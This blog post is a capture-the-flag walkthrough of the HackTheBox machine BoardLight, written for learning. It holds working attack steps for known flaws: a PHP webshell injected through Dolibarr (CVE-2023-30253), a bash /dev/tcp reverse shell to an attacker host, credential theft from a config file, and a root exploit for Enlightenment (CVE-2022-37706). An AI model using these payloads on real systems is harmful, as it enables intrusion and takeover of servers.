---
layout: post
title: "HackTheBox — BoardLight: From Dolibarr RCE to Root"
date: 2024-06-01
category: CTF
difficulty: Easy
platform: HackTheBox
points: 20
featured: true
tags: [htb, linux, dolibarr, rce, suid]
excerpt: "Exploiting a known RCE in Dolibarr ERP to gain initial foothold, then escalating to root via an SUID binary leveraging Enlightenment."
---

## Summary

BoardLight is an Easy-rated Linux box on HackTheBox. The path involves:

1. Discovering a Dolibarr ERP installation on a subdomain
2. Exploiting CVE-2023-30253 (Dolibarr PHP code injection)
3. Lateral movement via credentials found in the config
4. Root via a vulnerable SUID binary from the Enlightenment desktop environment

---

## Recon

Starting with an nmap scan:

```bash
nmap -sC -sV -oA scans/boardlight 10.10.11.11
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    Apache httpd 2.4.41
```

The web server on port 80 serves a static site for "Board.htb". After adding it to `/etc/hosts`, we enumerate subdomains:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
     -u http://board.htb -H "Host: FUZZ.board.htb" \
     -fc 301
```

We find `crm.board.htb`. Adding it to `/etc/hosts` reveals a **Dolibarr 17.0.0** installation.

<div class="note">
  <div><strong>Tip</strong> Always enumerate virtual hosts early — many HTB machines hide interesting services on subdomains.</div>
</div>

---

## Initial Foothold — CVE-2023-30253

Default credentials `admin:admin` work on the Dolibarr login. This version is vulnerable to **PHP code injection** in the website module.

The exploit flow:
1. Navigate to **Websites → New Site**
2. Create a new page and edit the HTML source
3. Inject PHP code wrapped in `<?PHP` tags (uppercase bypasses the filter)

```php
<?PHP system($_GET['cmd']); ?>
```

Testing RCE:

```
http://crm.board.htb/index.php?site=test&page=shell&cmd=id
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Now we catch a reverse shell:

```bash
# Listener
nc -lvnp 4444

# Payload (URL-encoded)
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
```

---

## Lateral Movement

Stabilise the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z
stty raw -echo; fg
```

Looking for credentials in the Dolibarr config:

```bash
find / -name "conf.php" 2>/dev/null
cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
```

```php
$dolibarr_main_db_pass='serverfun2$2023!!';
```

Password reuse check:

```bash
ssh larissa@board.htb
# Password: serverfun2$2023!!
```

✅ We're in as `larissa`. Grab `user.txt`.

---

## Privilege Escalation

Check for SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
```

Enlightenment is present. Check the version:

```bash
enlightenment --version
# ENLIGHTENMENT: 0.23.1
```

This version is vulnerable to **CVE-2022-37706** — a path traversal that leads to arbitrary command execution as root via the SUID `enlightenment_sys` binary.

```bash
# Exploit
mkdir -p /tmp/net
mkdir -p '/tmp/;/tmp/exploit'

echo "/bin/bash" > /tmp/exploit
chmod +x /tmp/exploit

enlightenment_sys /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8 '/tmp/;/tmp/exploit' /tmp/net
```

```
root@boardlight:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Grab `root.txt` from `/root/root.txt`.

---

## Summary

| Step | Detail |
|------|--------|
| Subdomain | `crm.board.htb` → Dolibarr 17.0.0 |
| Initial RCE | CVE-2023-30253 PHP injection via website module |
| Lateral | DB password reused by `larissa` |
| Privesc | CVE-2022-37706 SUID Enlightenment |

<div class="flag">
  <div><strong>Flags</strong> user.txt ✓ root.txt ✓</div>
</div>
